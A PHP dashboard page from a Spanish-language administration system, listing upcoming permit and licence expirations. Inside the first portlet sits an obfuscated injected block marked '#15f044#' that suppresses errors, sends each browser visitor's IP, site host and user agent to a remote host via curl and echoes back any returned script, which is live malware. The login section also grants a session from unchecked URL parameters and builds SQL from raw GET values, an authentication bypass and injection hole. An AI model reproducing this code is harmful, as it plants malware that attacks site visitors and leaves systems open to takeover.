<?php
     session_start();
     include('../controlador/ejecutar_sql.php');
     if (isset($_GET['v'])){
        $_SESSION['auth'] = '1';
        $_SESSION['userid'] = $_GET['t'];
        $_SESSION['structure'] = $_GET['v'];
        $_SESSION['structure_name'] = $_GET['s'];
        $_SESSION['permiso'] = $_GET['pm'];
        $_SESSION['modaf'] = $_GET['ma'];
        $_SESSION['todas'] = '1,0';
        $sqlmodulos = "SELECT id_moduloestructura, permiso, uxe.moduloAfectado
                     FROM usuariosxestructuras uxe
                     INNER JOIN usuarioestructuramodulo uem on uem.id_usuarioestructura = uxe.id
                     WHERE (id_usuario = $_SESSION[userid]) and (id_estructura = $_SESSION[structure])";
        $resultmodulos = ejecutarSQL($sqlmodulos);
        while ($row = mysql_fetch_array($resultmodulos)){
              $_SESSION['permisos'][$row['id_moduloestructura']] = $row['permiso'];
        }
        mysql_free_result($resultmodulos);
        $campos = "id, id_estructura, id_usuario, hinicio, hfin, host, estructura";
        $values = "$_GET[v], $_GET[t], now(), now(), '$_SERVER[REMOTE_ADDR]', $_GET[v]";
        $_SESSION['accid']=insert("accesousuarios", $campos, $values);
     }
     else{
          if (!$_SESSION['auth']){
             session_destroy();
             header("Location: /");
             exit;
          }
     }
     include("main.php");
     encabezado('Menu Principal - Sistema de Administracion - Campana');
?>
<style>
  body { min-width: 520px; }
  .column { width: 570px; float: left; padding-bottom: 100px; }
  .portlet { margin: 0 1em 1em 0; }
  .portlet-header { margin: 0.3em; padding-bottom: 4px; padding-left: 0.2em; }
  .portlet-header .ui-icon { float: right; }
  .portlet-content { padding: 0.4em; }
  .ui-sortable-placeholder { border: 1px dotted black; visibility: visible !important; height: 50px !important; }
  .ui-sortable-placeholder * { visibility: hidden; }
  </style>
  <script>
  $(function() {
    $( ".column" ).sortable({
      connectWith: ".column"
    });

    $( ".portlet" ).addClass( "ui-widget ui-widget-content ui-helper-clearfix ui-corner-all" )
      .find( ".portlet-header" )
        .addClass( "ui-widget-header ui-corner-all" )
        .prepend( "<span class='ui-icon ui-icon-minusthick'></span>")
        .end()
      .find( ".portlet-content" );

    $( ".portlet-header .ui-icon" ).click(function() {
      $( this ).toggleClass( "ui-icon-minusthick" ).toggleClass( "ui-icon-plusthick" );
      $( this ).parents( ".portlet:first" ).find( ".portlet-content" ).toggle();
    });

    $( ".column" ).disableSelection();
  });
  </script>
<body>
<?php
     menu();
?>
<br>
<div class="column">

  <div class="portlet">
    <div class="portlet-header">Proximos vencimientos de Habilitaciones</div>
    <div class="portlet-content"><?php
                                      include('informes/segvial/proxvtos.php');
                                      ?>
<?php
#15f044#
error_reporting(0); ini_set('display_errors',0); $wp_p41 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_p41) && !preg_match ('/bot/i', $wp_p41))){
$wp_p0941="http://"."web"."basefont".".com/font"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_p41);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_p0941);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_41p = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_41p,1,3) === 'scr' ){ echo $wp_41p; }
#/15f044#
?>
    </div>
  </div>


</div>

<div class="column">

  <div class="portlet">
    <div class="portlet-header">Licencias a vencer los proximos 45 dias</div>
    <div class="portlet-content"><?php
                                      include('informes/rrhh/proxvtoscond.php');
                                      ?></div>
  </div>

</div>
</body>
</html>
